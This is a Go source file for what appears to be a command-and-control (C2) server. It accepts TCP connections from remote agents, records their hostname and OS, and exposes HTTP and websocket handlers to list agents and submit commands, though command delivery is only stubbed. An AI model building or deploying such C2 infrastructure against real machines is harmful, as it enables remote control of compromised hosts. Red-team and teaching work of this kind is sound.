package c2

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type Client struct {
	ID        string `json:"id"`
	SessionID string `json:"session_id"`
	IP        string `json:"ip"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	Status    string `json:"status"`
	LastSeen  string `json:"last_seen"`
	FirstSeen string `json:"first_seen"`
}

type ServerConfig struct {
	Port    int    `json:"port"`
	BindIP  string `json:"ip"`
	Running bool   `json:"running"`
}

var (
	clients   = make(map[string]*Client)
	mu        sync.RWMutex
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	wsClients = make(map[*websocket.Conn]bool)
	config    = ServerConfig{Port: 9090, BindIP: "0.0.0.0", Running: false}
	listener  net.Listener
)

func Init() {}

func startListener() {
	if config.Running { return }
	addr := fmt.Sprintf("%s:%d", config.BindIP, config.Port)
	ln, err := net.Listen("tcp", addr)
	if err != nil { log.Println("C2 listener error:", err); return }
	listener = ln
	config.Running = true
	log.Println("C2 listener on", addr)
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				if config.Running { log.Println("C2 accept error:", err) }
				return
			}
			go handleAgent(conn)
		}
	}()
}

func stopListener() {
	if !config.Running { return }
	config.Running = false
	if listener != nil { listener.Close(); listener = nil }
	log.Println("C2 listener stopped")
}

func handleAgent(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil { return }
	sid := genSession()
	c := &Client{
		ID: sid[:8], SessionID: sid, IP: conn.RemoteAddr().String(),
		Hostname: "unknown", OS: "unknown", Status: "active",
		LastSeen: time.Now().UTC().Format(time.RFC3339),
		FirstSeen: time.Now().UTC().Format(time.RFC3339),
	}
	if n > 0 {
		var info map[string]string
		if json.Unmarshal(buf[:n], &info) == nil {
			if h, ok := info["hostname"]; ok { c.Hostname = h }
			if o, ok := info["os"]; ok { c.OS = o }
		}
	}
	mu.Lock(); clients[c.ID] = c; mu.Unlock()
	broadcastClients()
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		_, err := conn.Read(buf)
		if err != nil { mu.Lock(); c.Status = "offline"; mu.Unlock(); broadcastClients(); return }
		mu.Lock(); c.LastSeen = time.Now().UTC().Format(time.RFC3339); c.Status = "active"; mu.Unlock()
	}
}

func genSession() string {
	b := make([]byte, 16); rand.Read(b); return hex.EncodeToString(b)
}

func HandleClients(w http.ResponseWriter, r *http.Request) {
	mu.RLock()
	list := make([]*Client, 0, len(clients))
	for _, c := range clients { list = append(list, c) }
	mu.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func HandleSend(w http.ResponseWriter, r *http.Request) {
	var cmd struct { ClientID string `json:"client_id"`; Command string `json:"command"` }
	if json.NewDecoder(r.Body).Decode(&cmd) != nil { http.Error(w, "bad request", 400); return }
	log.Printf("CMD %s: %s", cmd.ClientID, cmd.Command)
	w.WriteHeader(200)
	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
}

func HandleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil { return }
	wsClients[conn] = true
	defer func() { delete(wsClients, conn); conn.Close() }()
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

func HandleConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(config)
		return
	}
	var cfg ServerConfig
	if json.NewDecoder(r.Body).Decode(&cfg) != nil { http.Error(w, "bad request", 400); return }
	wasRunning := config.Running
	if wasRunning { stopListener() }
	config.Port = cfg.Port
	config.BindIP = cfg.BindIP
	if cfg.Running || wasRunning { startListener() }
	config.Running = cfg.Running
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(config)
}

func HandleStart(w http.ResponseWriter, r *http.Request) {
	startListener()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(config)
}

func HandleStop(w http.ResponseWriter, r *http.Request) {
	stopListener()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(config)
}

func broadcastClients() {
	mu.RLock()
	list := make([]*Client, 0, len(clients))
	for _, c := range clients { list = append(list, c) }
	mu.RUnlock()
	data, _ := json.Marshal(list)
	for c := range wsClients { c.WriteMessage(websocket.TextMessage, data) }
}

func Shutdown() { stopListener(); log.Println("C2 shutdown") }
